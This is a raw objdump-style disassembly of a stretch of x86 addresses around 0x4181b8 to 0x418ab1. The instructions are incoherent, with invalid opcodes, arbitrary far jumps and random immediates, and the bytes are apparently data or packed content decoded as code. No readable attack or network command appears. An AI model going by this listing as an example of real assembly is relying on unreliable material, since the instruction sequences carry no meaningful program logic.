  4181b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181b9:	scas   al,BYTE PTR es:[edi]
  4181ba:	adc    BYTE PTR [ebx-0x57],ah
  4181bd:	les    edi,FWORD PTR [edx]
  4181bf:	mov    ds:0x7e6325fd,ax
  4181c5:	xchg   ebx,eax
  4181c6:	pop    ds
  4181c7:	ins    BYTE PTR es:[edi],dx
  4181c8:	mov    edi,0x6863f74f
  4181cd:	loope  0x4181d7
  4181cf:	inc    edi
  4181d0:	jg     0x418214
  4181d2:	cmp    dh,BYTE PTR [ebp-0x5e]
  4181d5:	test   eax,0xde73723c
  4181da:	pop    ds
  4181db:	jno    0x4181dd
	...
  4181ed:	add    BYTE PTR [eax],al
  4181ef:	add    BYTE PTR [edi-0x3],bl
  4181f2:	cmp    eax,0x12416a6d
  4181f7:	pop    edi
  4181f8:	fdiv   DWORD PTR ds:[esi+eax*2]
  4181fc:	sub    eax,0x2850354f
  418201:	xchg   esp,eax
  418202:	xchg   esp,eax
  418203:	sub    ch,BYTE PTR [ebx]
  418205:	jp     0x418199
  418207:	aas    
  418208:	push   edx
  418209:	pusha  
  41820a:	scas   eax,DWORD PTR es:[edi]
  41820b:	aas    
  41820c:	push   esp
  41820d:	jnp    0x4181a1
  41820f:	pop    ss
  418210:	sbb    eax,0x2a329294
  418215:	cmp    BYTE PTR [esi+0x24],0xfe
  418219:	outs   dx,DWORD PTR ds:[esi]
  41821a:	fwait
  41821b:	dec    ecx
  41821c:	jecxz  0x4181a4
  41821e:	mov    cl,0x3f
  418220:	fdivr  QWORD PTR [eax+0x54]
  418223:	sub    ebp,ebx
  418225:	jp     0x418279
  418227:	inc    eax
  418228:	shl    BYTE PTR [eax+0x2f],cl
  41822b:	inc    eax
  41822c:	aam    0x79
  41822e:	push   edx
  41822f:	sbb    ch,bl
  418231:	xchg   esp,eax
  418232:	adc    dh,BYTE PTR [ebx]
  418234:	jmp    0x1b6f:0xbe253e80
  41823b:	dec    edx
  41823c:	jecxz  0x4181c4
  41823e:	call   DWORD PTR [eax-0x25]
  418241:	jp     0x418243
  418243:	sub    ebp,DWORD PTR [edi-0x47cbcc7a]
  418249:	jg     0x418251
  41824b:	sub    eax,0x4a2385b2
  418250:	shl    BYTE PTR [ebx+ebp*1+0x4c],0x0
	...
  418265:	add    BYTE PTR [eax],al
  418267:	add    BYTE PTR [ecx-0x73e9047b],ah
  41826d:	gs push cs
  41826f:	sub    bh,BYTE PTR [eax-0x7f]
  418272:	add    BYTE PTR [esi],dl
  418274:	outs   dx,DWORD PTR ds:[esi]
  418275:	push   0x687e24a5
  41827a:	mov    dl,0x24
  41827c:	bound  ebp,QWORD PTR [edi-0x3d]
  41827f:	inc    edi
  418280:	imul   esi,DWORD PTR [ebx-0x4d],0x32
  418284:	jno    0x4182e2
  418286:	fcom   DWORD PTR [esi]
  418288:	pop    eax
  418289:	jns    0x41823c
  41828b:	sbb    al,0x68
  41828d:	push   edx
  41828e:	or     BYTE PTR [ebp-0x459aa381],bl
  418294:	mov    ds:0x65965994,eax
  418299:	cmp    BYTE PTR [ebp-0x78],0x81
  41829d:	jne    0x4182f3
  41829f:	scas   eax,DWORD PTR es:[edi]
  4182a0:	push   0x62ad3a86
  4182a5:	imul   edi,DWORD PTR [esi-0x74],0x885f506b
  4182ac:	mov    ebx,0xb0a16d77
  4182b1:	cmp    DWORD PTR [esi+edi*2-0x5f],0xffffff81
  4182b6:	push   esp
  4182b7:	das    
  4182b8:	mov    ah,0x64
  4182ba:	inc    eax
  4182bb:	dec    esi
  4182bc:	add    DWORD PTR [eax+0x729d3a08],0x86af567c
  4182c6:	imul   esp,DWORD PTR ds:0x97a69c6,0x0
	...
  4182dd:	add    BYTE PTR [eax],al
  4182df:	add    bl,bl
  4182e1:	imul   esp,DWORD PTR [esi+0x48],0xd7a7575
  4182e8:	sub    DWORD PTR [ecx+0x7e],0x5f50640c
  4182ef:	or     BYTE PTR [edi+esi*2+0x6d],bl
  4182f3:	and    DWORD PTR [edi-0x7d],esi
  4182f6:	jl     0x4182f6
  4182f8:	add    DWORD PTR [ecx+0x64542f54],0x80a10e40
  418302:	or     BYTE PTR [ecx],bl
  418304:	scas   eax,DWORD PTR es:[edi]
  418305:	cmp    DWORD PTR [ecx-0xa],0xffffffbc
  418309:	xchg   BYTE PTR [ecx+ebp*8+0x47],ch
  41830d:	ja     0x418388
  41830f:	aad    0x3d
  418311:	imul   esp,DWORD PTR [ebx-0x34],0xc479658f
  418318:	adc    DWORD PTR [esp+eax*2+0x69c2bc00],0x70b00200
  418323:	pop    edi
  418324:	shl    DWORD PTR [eax-0x3d33d188],cl
  41832a:	ins    DWORD PTR es:[edi],dx
  41832b:	add    cl,cl
  41832d:	pop    ebx
  41832e:	inc    eax
  41832f:	dec    ecx
  418330:	out    0x58,al
  418332:	dec    ecx
  418333:	push   edx
  418334:	mov    ch,0x5d
  418336:	data16 jae 0x41833a
  418339:	mov    dh,0x64
  41833b:	ins    BYTE PTR es:[edi],dx
  41833c:	loope  0x4182fb
  41833e:	jp     0x418340
  418340:	xor    esp,DWORD PTR [eax+0x4978]
	...
  418356:	add    BYTE PTR [eax],al
  418358:	or     edi,DWORD PTR [ebx-0x51079eba]
  41835e:	or     BYTE PTR [ebx-0x26],dl
  418361:	mov    edx,0x9ed4777c
  418366:	imul   ebx,DWORD PTR [edx+esi*4-0x48],0xaf99736d
  41836e:	jp     0x4183cc
  418370:	jb     0x41832d
  418372:	data16 fisubr DWORD PTR fs:[ebp-0x3a89df89]
  41837a:	popa   
  41837b:	ins    DWORD PTR es:[edi],dx
  41837c:	(bad)
  418380:	xchg   edi,eax
  418381:	nop
  418382:	push   edi
  418383:	outs   dx,DWORD PTR ds:[esi]
  418384:	xchg   ebx,eax
  418385:	lods   al,BYTE PTR ds:[esi]
  418386:	jnp    0x4183e9
  418388:	xchg   DWORD PTR [edi-0x4472b8ac],ebp
  41838e:	ja     0x4183fc
  418390:	sbb    BYTE PTR [esi-0x5365abac],0x55
  418397:	ins    BYTE PTR es:[edi],dx
  418398:	aad    0x50
  41839a:	arpl   WORD PTR [ebp-0x8],bp
  41839d:	mov    dl,0x66
  41839f:	shl    BYTE PTR fs:[ecx-0x5be3a3f8],0x77
  4183a7:	ja     0x418335
  4183a9:	aam    0x1c
  4183ab:	popa   
  4183ac:	fs std 
  4183ae:	cmp    esp,DWORD PTR [edi+0x58]
  4183b1:	fcomp  DWORD PTR [ebx]
  4183b3:	pop    esp
  4183b4:	mov    WORD PTR [ecx],gs
  4183b6:	inc    edx
  4183b7:	jo     0x4183f8
  4183b9:	inc    esi
  4183ba:	and    dh,BYTE PTR [eax+eax*1+0x0]
	...
  4183ce:	add    BYTE PTR [eax],al
  4183d0:	das    
  4183d1:	aad    0x34
  4183d3:	push   ebp
  4183d4:	pop    edi
  4183d5:	into   
  4183d6:	ds push esp
  4183d8:	cmp    al,0xfd
  4183da:	xor    al,0x75
  4183dc:	xor    eax,0x2a66f70f
  4183e1:	adc    al,0x9
  4183e3:	cs and eax,0xe300221f
  4183e9:	sub    cl,BYTE PTR [eax+0x46]
  4183ec:	fsubr  DWORD PTR ds:0x2bc54409
  4183f2:	or     DWORD PTR [ecx+ecx*8-0x49],eax
  4183f6:	inc    eax
  4183f7:	inc    edi
  4183f8:	mov    esi,0xb85349fd
  4183fd:	mov    eax,0xfdbc544e
  418402:	cmp    eax,DWORD PTR [ecx-0x3c]
  418405:	sbb    DWORD PTR fs:[ebx+edi*4-0x35],esi
  41840a:	adc    eax,DWORD PTR [eax]
  41840c:	fisttp WORD PTR [esi+0x2e]
  41840f:	je     0x4183d4
  418411:	pop    esp
  418412:	sbb    ah,BYTE PTR [ebx-0x30]
  418415:	mov    dh,0x38
  418417:	ins    DWORD PTR es:[edi],dx
  418418:	scas   al,BYTE PTR es:[edi]
  418419:	pushf  
  41841a:	cmp    BYTE PTR [ecx-0x31],dl
  41841d:	mov    esp,0xbab8433c
  418422:	pcmpeqb mm5,QWORD PTR [ecx-0x53afcf49]
  418429:	aas    
  41842a:	jmp    0x1fd1f776
  41842f:	pop    esp
  418430:	pop    ebp
  418431:	mov    edx,0x6d30
	...
  418446:	add    BYTE PTR [eax],al
  418448:	arpl   WORD PTR [ebx+ebx*8-0x207db4df],dx
  41844f:	xor    dh,BYTE PTR [ecx+0x6e]
  418452:	rcl    DWORD PTR [esi],cl
  418454:	cmp    eax,DWORD PTR [edx+0x78493fcc]
  41845a:	fisub  WORD PTR [ecx]
  41845c:	imul   edi,DWORD PTR [eax-0x6e],0x42
  418460:	and    DWORD PTR [esp+eiz*4+0x3f],0x4d
  418465:	cmp    DWORD PTR [ebx-0x509fb5d8],0xafb461e3
  41846f:	adc    DWORD PTR [ecx],esi
  418471:	outs   dx,BYTE PTR ds:[esi]
  418472:	test   BYTE PTR [edx],dl
  418474:	sbb    eax,0x332d767d
  418479:	js     0x418426
  41847b:	xor    al,0xcd
  41847d:	pusha  
  41847e:	xchg   BYTE PTR [esi],ch
  418480:	lock jb 0x418403
  418483:	adc    DWORD PTR [ecx+eiz*2+0x7df82576],ecx
  41848a:	inc    eax
  41848b:	adc    ch,bh
  41848d:	push   0x72f1302e
  418492:	inc    eax
  418493:	xor    BYTE PTR [ebp-0x30cbdfaf],bh
  418499:	push   0x6fc01922
  41849e:	sub    eax,0xf6b4dc38
  4184a3:	jecxz  0x418478
  4184a5:	jne    0x4184db
  4184a7:	sub    eax,edx
  4184a9:	arpl   WORD PTR [edx],sp
  4184ab:	cmp    BYTE PTR [eax],al
	...
  4184bd:	add    BYTE PTR [eax],al
  4184bf:	add    BYTE PTR [ecx-0x3cddfc8b],bh
  4184c5:	sbb    bh,0x32
  4184c8:	test   eax,0xb3171b6e
  4184cd:	add    BYTE PTR [eax+eax*2],0x51
  4184d1:	js     0x4184d9
  4184d3:	and    ah,BYTE PTR [ebx+0x78]
  4184d6:	or     BYTE PTR [edx],bl
  4184d8:	dec    edi
  4184d9:	lds    ebx,FWORD PTR [eax+0x24]
  4184dc:	dec    esp
  4184dd:	push   ebx
  4184de:	jnp    0x4184bd
  4184e0:	mov    ah,0x4e
  4184e2:	pop    esp
  4184e3:	mov    ecx,0xb928c0ef
  4184e8:	jge    0x418561
  4184ea:	outs   dx,BYTE PTR ds:[esi]
  4184eb:	les    edi,FWORD PTR [esi-0x7d]
  4184ee:	pop    edi
  4184ef:	(bad)  
  4184f0:	jns    0x418557
  4184f2:	fs popf 
  4184f4:	js     0x418549
  4184f6:	pop    esp
  4184f7:	(bad)  
  4184f8:	push   0x78
  4184fa:	push   0xffffffc8
  4184fc:	popf   
  4184fd:	xchg   esp,eax
  4184fe:	pop    ecx
  4184ff:	xchg   esi,eax
  418500:	jno    0x418482
  418502:	jge    0x41848c
  418504:	jge    0x418577
  418506:	push   esp
  418507:	scas   al,BYTE PTR es:[edi]
  418508:	imul   esi,DWORD PTR [edi+0x6a],0xffffff88
  41850c:	arpl   WORD PTR [ebx+0x49],sp
  41850f:	test   al,0xbf
  418511:	push   ecx
  418512:	push   esp
  418513:	stos   BYTE PTR es:[edi],al
  418514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418515:	sub    BYTE PTR [ebx-0x51],0xc3
  418519:	sub    BYTE PTR fs:[ecx+0x54654d6f],dh
  418520:	mov    bl,0x68
  418522:	push   edi
  418523:	sub    al,BYTE PTR [eax]
	...
  418535:	add    BYTE PTR [eax],al
  418537:	add    BYTE PTR [edi+esi*2+0x65ae4565],ah
  41853e:	jp     0x418529
  418540:	pushf  
  418541:	ja     0x4185b1
  418543:	cmp    eax,0x447a65a1
  418548:	int3   
  418549:	dec    edi
  41854a:	fs inc esi
  41854c:	outs   dx,BYTE PTR ds:[esi]
  41854d:	gs fs sbb cl,ch
  418551:	lds    ebx,FWORD PTR [eax+0x2c]
  418554:	int3   
  418555:	push   ebx
  418556:	jnp    0x41856d
  418558:	imul   ecx,DWORD PTR [esi+0x5c],0x39
  41855c:	xor    BYTE PTR [ebp+0x777e3928],bh
  418562:	outs   dx,BYTE PTR ds:[esi]
  418563:	add    BYTE PTR [eax-0x6d96885d],bl
  418569:	mov    dh,0x55
  41856b:	ins    BYTE PTR es:[edi],dx
  41856c:	mov    eax,ds:0xf25447c1
  418571:	mov    bh,0x64
  418573:	(bad)  
  418574:	aam    0xa2
  418576:	or     BYTE PTR [edx+ebp*1-0x4b],bl
  41857a:	arpl   WORD PTR [edx-0x3c],sp
  41857d:	mov    ah,0x57
  41857f:	inc    ebx
  418580:	and    al,0xc1
  418582:	dec    ecx
  418583:	pop    esp
  418584:	neg    BYTE PTR [ebp-0x43149a84]
  41858a:	pop    eax
  41858b:	add    BYTE PTR [ecx],ah
  41858d:	push   eax
  41858e:	outs   dx,DWORD PTR fs:[esi]
  418590:	(bad)  
  418591:	mov    cl,0x64
  418593:	push   ebx
  418594:	not    BYTE PTR [ecx+0x58]
  418597:	inc    ebp
  418598:	loope  0x4185ed
  41859a:	jns    0x418610
	...
  4185b0:	or     BYTE PTR [edi+0x5c],cl
  4185b3:	push   eax
  4185b4:	(bad)
  4185b7:	outs   dx,DWORD PTR ds:[esi]
  4185b8:	jne    0x41857e
  4185ba:	dec    ebx
  4185bb:	ins    BYTE PTR es:[edi],dx
  4185bc:	adc    dh,BYTE PTR [esi+0x55166c55]
  4185c2:	xor    eax,0x47c42850
  4185c7:	jne    0x418592
  4185c9:	mov    ebx,0xf8a5544e
  4185ce:	inc    eax
  4185cf:	imul   edi,DWORD PTR [ecx-0x59a3f745],0x7b657cab
  4185d9:	mov    esp,0xa5a10058
  4185de:	popa   
  4185df:	cs leave 
  4185e1:	mov    bh,0x7c
  4185e3:	add    BYTE PTR [esi-0x758b914f],dl
  4185e9:	mov    bh,0x7a
  4185eb:	gs popa 
  4185ed:	pop    edx
  4185ee:	fs popa 
  4185f0:	mov    WORD PTR [esi-0x424bb9dc],ds
  4185f6:	dec    eax
  4185f7:	xor    DWORD PTR [esi+ebx*4+0xa786623],ecx
  4185fe:	sub    dh,BYTE PTR [edx+0x71]
  418601:	test   eax,0xfe6d6c4e
  418606:	and    BYTE PTR [esi+0x44],al
  418609:	cmp    eax,0xdb735109
  41860e:	sbb    al,0x75
  418610:	ins    DWORD PTR es:[edi],dx
  418611:	fild   QWORD PTR ds:0x5c
	...
  418627:	add    BYTE PTR [edx+0x41],cl
  41862a:	sub    dh,BYTE PTR [ecx+0x34]
  41862d:	xor    esi,DWORD PTR [ecx]
  41862f:	push   eax
  418630:	pusha  
  418631:	or     DWORD PTR [ecx],ecx
  418633:	inc    edi
  418634:	sub    bh,BYTE PTR [esi]
  418636:	sbb    eax,0x2e41205f
  41863b:	jb     0x41868d
  41863d:	or     al,0x1d
  41863f:	push   0x681d0c3c
  418644:	mov    WORD PTR ds:0xed24742a,ds
  41864a:	inc    ecx
  41864b:	outs   dx,BYTE PTR ds:[esi]
  41864c:	inc    DWORD PTR [ecx-0x320f93d6]
  418652:	cmp    BYTE PTR [edi+0x0],bl
  418655:	push   ss
  418656:	or     DWORD PTR [ebp+ebp*8-0x77],eax
  41865a:	sub    al,BYTE PTR [esi-0x5]
  41865d:	imul   ebp,DWORD PTR [eax],0x3cedde63
  418663:	push   ecx
  418664:	in     eax,0x61
  418666:	daa    
  418667:	jno    0x41860b
  418669:	pop    ecx
  41866a:	sub    esi,DWORD PTR [esp+ecx*4-0x47]
  41866e:	cmp    esi,DWORD PTR [ebx-0x4b]
  418671:	dec    esi
  418672:	and    eax,0x184cb02e
  418677:	add    al,dl
  418679:	mov    ch,0x23
  41867b:	jno    0x41861d
  41867d:	xchg   esp,eax
  41867e:	push   ds
  41867f:	push   ss
  418680:	fwait
  418681:	mov    dl,0xb
  418683:	and    eax,0x423b94a0
  418688:	mov    al,ds:0x2c1275
	...
  41869d:	add    BYTE PTR [eax],al
  41869f:	add    BYTE PTR [edx+0x5c],dl
  4186a2:	(bad)  
  4186a5:	xchg   esp,eax
  4186a6:	adc    eax,DWORD PTR [edx+0x68]
  4186a9:	jne    0x41869d
  4186ab:	sub    ecx,DWORD PTR [edx+0x5c]
  4186ae:	(bad)  
  4186b1:	xchg   esp,eax
  4186b2:	retf   
  4186b3:	inc    ecx
  4186b4:	imul   esi,DWORD PTR [eax-0x34],0x3d
  4186b8:	jae    0x41872a
  4186ba:	retf   
  4186bb:	and    al,0x8c
  4186bd:	pusha  
  4186be:	shr    BYTE PTR [eax+eax*2],cl
  4186c1:	jns    0x41869f
  4186c3:	and    al,0x32
  4186c5:	jne    0x418695
  4186c7:	and    BYTE PTR [esi],bh
  4186c9:	mov    dl,0xb7
  4186cb:	sub    BYTE PTR [eax],ah
  4186cd:	xchg   esp,eax
  4186ce:	adc    DWORD PTR ds:0x2984772f,0x18
  4186d5:	xchg   DWORD PTR [ebp+edx*1+0x16917922],ecx
  4186dc:	bound  edi,QWORD PTR [esp+esi*2+0x27]
  4186e0:	mov    WORD PTR [eax-0x7b],fs
  4186e3:	sub    al,0xf0
  4186e5:	ja     0x418670
  4186e7:	sub    al,0xe8
  4186e9:	jo     0x41866b
  4186eb:	jmp    0x3b4f6eb
  4186f0:	mov    ebp,0xd9104571
  4186f5:	jae    0x418748
  4186f7:	and    DWORD PTR [eax-0x10d7b7a6],edi
  4186fd:	pop    esi
  4186fe:	dec    eax
  4186ff:	sub    BYTE PTR [eax+0x36df73],bh
	...
  418715:	add    BYTE PTR [eax],al
  418717:	add    BYTE PTR [ecx-0x24ecc486],dh
  41871d:	xchg   BYTE PTR [eax],cl
  41871f:	dec    esp
  418720:	je     0x41877c
  418722:	pop    edi
  418723:	cmp    eax,0x155f5e6d
  418728:	je     0x41878b
  41872a:	sub    BYTE PTR [edx],ch
  41872c:	fs jns 0x41879a
  41872f:	pop    es
  418730:	jl     0x4186c6
  418732:	aas    
  418733:	jmp    DWORD PTR [edx-0x4bea9878]
  418739:	pop    edi
  41873a:	dec    esp
  41873b:	adc    BYTE PTR [edx-0x64f9bf6c],ah
  418741:	mov    BYTE PTR [eax],cl
  418743:	adc    al,0x83
  418745:	jne    0x4187c1
  418747:	jmp    0xdabae8eb
  41874c:	(bad)  
  41874d:	fs fild DWORD PTR gs:[ebx+0x74c45a94]
  418755:	outs   dx,DWORD PTR ds:[esi]
  418756:	jl     0x418724
  418758:	scas   eax,DWORD PTR es:[edi]
  418759:	push   ebp
  41875a:	pop    edi
  41875b:	mov    ebx,0xbb6b638f
  418760:	popf   
  418761:	jne    0x4187dd
  418763:	or     DWORD PTR [ecx+ecx*4+0x78],ebx
  418767:	mov    WORD PTR [edi+0x7d9b6b63],cs
  41876d:	jne    0x4187e9
  41876f:	mov    DWORD PTR [edi+0x6f],0x638f9579
  418776:	imul   edi,DWORD PTR [ebx-0x63],0x75
  41877a:	jp     0x41874b
	...
  418790:	mov    esp,0x8f7b6b83
  418795:	arpl   WORD PTR [ebx+0x7b],bp
  418798:	jge    0x41880f
  41879a:	jp     0x4187b3
  41879c:	cwde   
  41879d:	popa   
  41879e:	jns    0x4187fa
  4187a0:	nop
  4187a1:	arpl   WORD PTR [ebx+0x5b],bp
  4187a4:	jle    0x41881b
  4187a6:	jp     0x4187a7
  4187a8:	jg     0x418819
  4187aa:	jp     0x4187ac
  4187ac:	sbb    DWORD PTR [eax-0x4f7e9ea8],0xaac05308
  4187b6:	jle    0x41881d
  4187b8:	les    edi,FWORD PTR [di+0x70]
  4187bc:	nop
  4187bd:	cwde   
  4187be:	inc    esp
  4187bf:	popa   
  4187c0:	jbe    0x418766
  4187c2:	sub    BYTE PTR [ebx-0x80],dl
  4187c5:	stos   BYTE PTR es:[edi],al
  4187c6:	jle    0x41882d
  4187c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c9:	clc    
  4187ca:	dec    esp
  4187cb:	outs   dx,DWORD PTR ds:[esi]
  4187cc:	push   es
  4187cd:	xchg   ecx,eax
  4187ce:	or     BYTE PTR [esp+eax*4-0x59],cl
  4187d2:	jl     0x4187f4
  4187d4:	xchg   esi,eax
  4187d5:	mov    eax,ds:0xaa90767a
  4187da:	sub    BYTE PTR [ebp-0x3a],dl
  4187dd:	mov    eax,ds:0xb629007a
  4187e2:	ja     0x418858
  4187e4:	test   edi,eax
  4187e6:	imul   esi,DWORD PTR [edx-0x1d],0x25207aa1
  4187ed:	mov    dh,0x77
  4187ef:	jae    0x418796
  4187f1:	pop    eax
  4187f2:	push   ebp
  4187f3:	jae    0x4187f5
	...
  418805:	add    BYTE PTR [eax],al
  418807:	add    cl,dh
  418809:	hlt    
  41880a:	push   edi
  41880b:	gs out 0xa2,eax
  41880e:	imul   esi,DWORD PTR [edx-0x2b],0x17263c4
  418815:	xchg   ebp,eax
  418816:	inc    esp
  418817:	popa   
  418818:	not    BYTE PTR [eax-0x55efacd8]
  41881e:	jle    0x418885
  418820:	pop    es
  418821:	hlt    
  418822:	inc    esp
  418823:	popa   
  418824:	add    DWORD PTR [eax+ecx*1+0x7ca9044c],ebp
  41882b:	and    BYTE PTR [esi],al
  41882d:	lahf   
  41882e:	jp     0x4188a6
  418830:	shl    BYTE PTR [esi-0x5713abd8],1
  418836:	imul   eax,DWORD PTR [eax],0x5038af8c
  41883c:	ins    BYTE PTR es:[edi],dx
  41883d:	lahf   
  41883e:	sub    DWORD PTR [esi-0x4b],esi
  418841:	dec    esi
  418842:	sub    DWORD PTR [ebx+ebp*4-0x45],esi
  418846:	or     al,0x46
  418848:	fcomp  DWORD PTR [ebp-0x3f44bf14]
  41884e:	sub    eax,0x1591b25f
  418853:	jb     0x4187e1
  418855:	xchg   edi,eax
  418856:	sbb    BYTE PTR [eax-0x60],dh
  418859:	xchg   esp,eax
  41885a:	sbb    esi,DWORD PTR [edx+edi*4-0x57]
  41885e:	adc    al,0x74
  418860:	mov    WORD PTR [ecx-0x6e978cb2],?
  418866:	adc    eax,0x1ffb5c74
  41886b:	ins    DWORD PTR es:[edi],dx
	...
  418880:	jb     0x41884f
  418882:	cmp    ebp,DWORD PTR [ebp+0x6a]
  418885:	loope  0x41889e
  418887:	pop    edi
  418888:	pop    esi
  418889:	fmul   DWORD PTR [eax]
  41888b:	cs push 0x7a0004cc
  418891:	retf   
  418892:	sbb    BYTE PTR [ecx-0x74],dh
  418895:	sbb    ah,BYTE PTR [eax]
  418897:	inc    ax
  418899:	inc    esi
  41889a:	sub    dh,BYTE PTR [edx+0x29]
  41889d:	sub    DWORD PTR [ebx+0x50],ecx
  4188a0:	push   edx
  4188a1:	sub    DWORD PTR [ecx],edi
  4188a3:	pop    esp
  4188a4:	dec    esi
  4188a5:	and    BYTE PTR ds:0xe929316c,ch
  4188ab:	dec    edi
  4188ac:	push   ds
  4188ad:	push   ss
  4188ae:	and    BYTE PTR [esi-0x54],ah
  4188b1:	aaa    
  4188b2:	and    eax,0x2a48e050
  4188b7:	addr16 jmp 0x1881:0xea6d3bed
  4188bf:	pop    edi
  4188c0:	ficomp WORD PTR [eax]
  4188c2:	cmp    eax,0x5b94d942
  4188c7:	sub    bh,ch
  4188c9:	mov    BYTE PTR [edi],ch
  4188cb:	adc    ah,cl
  4188cd:	outs   dx,DWORD PTR ds:[esi]
  4188ce:	inc    ebp
  4188cf:	in     al,0xdc
  4188d1:	outs   dx,DWORD PTR ds:[esi]
  4188d2:	dec    ebp
  4188d3:	adc    BYTE PTR [ecx-0x27dece8b],bh
  4188d9:	push   edx
  4188da:	cmp    al,0x28
  4188dc:	mov    al,ds:0x9e343379
  4188e1:	outs   dx,DWORD PTR ds:[esi]
  4188e2:	ss push ds
	...
  4188f8:	ins    BYTE PTR es:[edi],dx
  4188f9:	push   esi
  4188fa:	xor    esi,DWORD PTR [esp+ebp*2]
  4188fd:	push   ebx
  4188fe:	add    ebp,DWORD PTR ds:0x38136eaf
  418904:	push   edi
  418905:	jne    0x41890f
  418907:	mov    WORD PTR es:[ebx+0x1e],fs
  41890b:	push   ds
  41890c:	add    BYTE PTR [edi+0x606f1200],0x21
  418913:	xor    al,0x52
  418915:	push   0x894e380f
  41891a:	(bad)  [edi]
  41891c:	outs   dx,DWORD PTR ds:[esi]
  41891d:	mov    bh,bh
  41891f:	xor    ebx,DWORD PTR [esi+0x6f]
  418922:	into   
  418923:	sbb    eax,0x33bb566c
  418928:	pusha  
  418929:	dec    edi
  41892a:	scas   eax,DWORD PTR es:[edi]
  41892b:	rdpmc  
  41892d:	outs   dx,DWORD PTR ds:[esi]
  41892e:	lds    edx,FWORD PTR [edx]
  418930:	mov    WORD PTR [ebx-0x32],fs
  418933:	sbb    eax,0x11c08720
  418938:	das    
  418939:	pusha  
  41893a:	mov    eax,ds:0x8c702810
  41893f:	(bad)  
  418941:	or     BYTE PTR [esi-0x4d4b0dda],0x26
  418948:	jmp    0x9377:0xfe247688
  41894f:	inc    ecx
  418950:	push   DWORD PTR [eax+0x8]
  418953:	test   DWORD PTR [eax+ecx*4+0x6faa7b58],ebp
  41895a:	outs   dx,BYTE PTR ds:[esi]
  41895b:	or     DWORD PTR [eax],eax
	...
  41896d:	add    BYTE PTR [eax],al
  41896f:	add    BYTE PTR [edx-0x30f6a798],bl
  418975:	jo     0x4189d6
  418977:	dec    esp
  418978:	jb     0x418902
  41897a:	push   esp
  41897b:	push   ds
  41897c:	cwde   
  41897d:	mov    BYTE PTR [edi+0x56],bl
  418980:	jb     0x418905
  418982:	or     BYTE PTR [edx],bl
  418984:	imul   esi,DWORD PTR [esi+0x7c],0x3e
  418988:	jno    0x41890c
  41898a:	imul   ecx,DWORD PTR ds:0x3d4e64ce,0x60
  418991:	xchg   esp,eax
  418992:	inc    esp
  418993:	or     BYTE PTR [edi-0x78],bh
  418996:	pop    ecx
  418997:	or     al,0x9f
  418999:	sbb    DWORD PTR [edi-0x2],0xffffffa9
  41899d:	push   esi
  41899e:	pop    edi
  41899f:	adc    eax,0x105994ad
  4189a4:	pushf  
  4189a5:	jno    0x418a20
  4189a7:	sub    eax,0x200882b9
  4189ac:	stos   BYTE PTR es:[edi],al
  4189ad:	cmp    DWORD PTR [eax+ecx*8-0x4d],0x70
  4189b2:	dec    esp
  4189b3:	sar    BYTE PTR [ebp-0x53],1
  4189b6:	or     BYTE PTR [edi],al
  4189b8:	test   al,0x69
  4189ba:	fs jmp 0xc8a4ed3b
  4189c0:	popf   
  4189c1:	mov    BYTE PTR [esi-0x6b],cl
  4189c4:	jg     0x41895a
  4189c6:	dec    esi
  4189c7:	enter  0x6f99,0x7a
  4189cb:	rcl    BYTE PTR [ebx+0x7bd77971],0x5d
  4189d2:	jl     0x4189bd
	...
  4189e8:	inc    edi
  4189e9:	jne    0x418a64
  4189eb:	popf   
  4189ec:	mov    dl,0x82
  4189ee:	outs   dx,DWORD PTR ds:[esi]
  4189ef:	mov    edi,0x7c5da3
  4189f4:	gs mov eax,0xb3f7646c
  4189fa:	pop    edi
  4189fb:	sbb    DWORD PTR cs:[eax-0x5b1bff84],edi
  418a02:	ins    DWORD PTR es:[edi],dx
  418a03:	arpl   WORD PTR [esi-0x469e970a],di
  418a09:	cwde   
  418a0a:	push   esp
  418a0b:	push   esp
  418a0c:	call   0x6bb0f4b3
  418a11:	les    ebx,FWORD PTR [eax+0x0]
  418a14:	xchg   esi,eax
  418a15:	mov    bh,0x6e
  418a17:	je     0x418a93
  418a19:	mov    cl,0x7a
  418a1b:	gs add esp,0xb7d77279
  418a22:	dec    esi
  418a23:	push   esp
  418a24:	push   ebp
  418a25:	cwde   
  418a26:	ins    DWORD PTR es:[edi],dx
  418a27:	outs   dx,BYTE PTR ds:[esi]
  418a28:	jbe    0x4189ce
  418a2a:	push   ebp
  418a2b:	ins    BYTE PTR es:[edi],dx
  418a2c:	xchg   ecx,eax
  418a2d:	test   al,0x55
  418a2f:	je     0x4189be
  418a31:	cwde   
  418a32:	push   edi
  418a33:	outs   dx,DWORD PTR ds:[esi]
  418a34:	mov    esp,DWORD PTR [ebx+edi*2+0x549df761]
  418a3b:	push   ebx
  418a3c:	xchg   edx,eax
  418a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a3e:	push   ebp
  418a3f:	pop    esp
  418a40:	stos   DWORD PTR es:[edi],eax
  418a41:	mov    esi,0x9115544e
  418a46:	inc    edi
  418a47:	jb     0x418a11
  418a49:	pushf  
  418a4a:	imul   ebp,DWORD PTR [esi+0x0],0x0
	...
  418a5d:	add    BYTE PTR [eax],al
  418a5f:	add    cl,ch
  418a61:	test   eax,0xb2066c55
  418a66:	fs je  0x418a0e
  418a69:	push   ebx
  418a6a:	jp     0x418ad1
  418a6c:	leave  
  418a6d:	popf   
  418a6e:	data16 je 0x418a3d
  418a71:	mov    cl,0x64
  418a73:	inc    ebx
  418a74:	int    0x9d
  418a76:	imul   esp,DWORD PTR [di+0x63c3],0x66
  418a7c:	stc    
  418a7d:	(bad)  
  418a7e:	push   ebp
  418a7f:	jb     0x418a0d
  418a81:	or     BYTE PTR ds:0x2a21f351,bh
  418a87:	pop    esp
  418a88:	shr    BYTE PTR [ebx],cl
  418a8a:	xor    edx,DWORD PTR [esp+ebx*8+0x19]
  418a8e:	dec    esp
  418a8f:	jo     0x418a71
  418a91:	adc    al,0x2c
  418a93:	outs   dx,BYTE PTR ds:[esi]
  418a94:	fucomip st,st(5)
  418a96:	cmp    BYTE PTR [edi-0x21],bl
  418a99:	pop    esi
  418a9a:	add    ebp,DWORD PTR [ebp-0x22]
  418a9d:	push   ecx
  418a9e:	or     al,0x53
  418aa0:	mov    edi,0xad4e1a48
  418aa5:	mov    eax,0x62c40015
  418aaa:	pop    ss
  418aab:	je     0x418a7a
  418aad:	push   ecx
  418aae:	sbb    dh,BYTE PTR [ecx-0x74]
  418ab1:	lahf   
